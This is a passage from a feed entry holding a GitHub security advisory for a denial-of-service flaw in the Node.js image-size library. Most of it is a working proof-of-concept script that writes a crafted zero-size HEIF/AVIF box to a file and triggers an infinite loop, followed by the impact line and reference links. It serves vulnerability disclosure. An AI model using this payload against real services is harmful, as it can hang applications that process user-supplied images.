sizeOf = require(\"image-size\");\nconst fs = require('fs');\n\n// HEIF\nconst PAYLOAD = new Uint8Array([\n  0x00, 0x00, 0x00, 0x00, // Box with size 0\n  0x66, 0x74, 0x79, 0x70, // \"ftyp\"\n  0x61, 0x76, 0x69, 0x66  // \"avif\"\n]);\n\nconst FILENAME = \"./poc.svg\"\n\nfunction createPayload() {\n  fs.writeFileSync(FILENAME, PAYLOAD);\n}\n\nfunction poc1() {\n  sizeOf(FILENAME)\n  console.log('Done') // never executed\n}\n\nfunction poc2() {\n  sizeOf(PAYLOAD)\n  console.log('Done') // never executed\n}\n\nconst pocs = new Map();\npocs.set('poc1', poc1); // node main.js poc1\npocs.set('poc2', poc2); // node main.js poc2\n\nasync function run() {\n  createPayload()\n  const args = process.argv.slice(2);\n  const t = args[0];\n  const poc = pocs.get(t) || poc1;\n  console.log(`Running poc....`)\n  await poc();\n}\n\nrun();\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Denial of Service</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7\">https://github.com/image-size/image-size/security/advisories/GHSA-m5qc-5hw7-8vg7</a></li>\n<li><a href=\"https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68\">https://github.com/image-size/image-size/commit/8994131c7c3ee8da1699e04700c95e0e683a0c68</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m5qc-5hw7-8vg7\">https://github.com/advisories/GHSA-m5qc-5hw7-8vg7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m5qc-5hw7-8vg7",
            "title": "[image-size] image-size Denial of Service via Infinite Loop during Image Processing",
            "date_modified": "2025-04-02T15:04:59.000Z",
            "date_published": "2025-04-02T15:04:58.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m5qc-5hw7-8vg7"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}